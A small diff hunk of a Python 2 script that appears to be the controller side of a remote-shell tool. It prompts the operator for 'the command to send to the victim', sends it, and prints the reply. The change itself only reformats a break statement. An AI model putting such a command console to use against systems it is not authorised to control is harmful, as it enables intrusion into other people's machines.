@@ -57,7 +57,8 @@ class ThreadedTCPRequestHandler(SocketServer.BaseRequestHandler):
                 request = raw_input("Enter the command to send to the victim: ")
                 if request != "":
                     self.request.sendall(request)
-                    if request == "quit" or request == "exit": break
+                    if request == "quit" or request == "exit":
+                        break
                     try:
                         self.data = self.request.recv(1024).strip()
                         print self.data
